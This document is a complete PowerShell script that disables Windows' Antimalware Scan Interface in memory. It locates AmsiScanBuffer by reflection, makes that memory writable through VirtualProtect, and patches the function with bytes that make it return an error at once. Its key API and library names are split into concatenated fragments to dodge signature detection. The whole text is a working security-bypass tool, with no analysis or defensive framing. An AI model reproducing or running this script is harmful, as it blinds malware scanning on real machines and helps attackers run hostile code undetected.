# functions
function GetAddress($m, $f) {
    $sA = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'Sy' + 'ste' + 'm.dll'}

    $uNM = ForEach ($t in $sA.GetTypes()) {
        $t | Where-Object {$_.FullName -like '*Nati' + 'veM' + 'ethods' -and $_.Fullname -like '*Win32*' -and $_.Fullname -like '*Un*'}
    }

    $mH = $uNM.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
    $pA = $uNM.GetMethod('Ge' + 'tPro' + 'cAdd' + 'ress', [type[]]('IntPtr', 'System.String'))

    $m = $mH.Invoke($null, @($m))
    $pA.Invoke($null, @($m, $f))
}

function GetType($f, $dT = [Void]) {
    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])

    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $f).SetImplementationFlags('Runtime, Managed')
    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dT, $f).SetImplementationFlags('Runtime, Managed')

    return $t.CreateType()
}

# main
$aDll = "a" + "ms" + "i" + "." + "dll"
$sB = $aDll.Substring(0, 1).ToUpper() + $aDll.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
$aSB = GetAddress $aDll $sB

$vp = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f 'Pointer','nction','GetDelega','teFo','u','rF').Invoke((GetAddress ("kern" + "el3" + "2.dl" + "l") ("Vi" + "rtu" + "alPr" + "ote" + "ct")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))

$p = 0
$vp.Invoke($aSB, [uint32]5, 0x40, [Ref] $p) | Out-Null
$pb = [Byte[]] (184, 87, 0, 7, 128, 195)
$s = "[System."
$s += "Runti" + "me"
$s += ".Inte" + "ropSer" + "vices"
$s += ".Mars" + "hal]"
$s += "::"
$s += "Copy"

$i = Invoke-Expression ($s + "(`$pb, 0, `$aSB, 6)")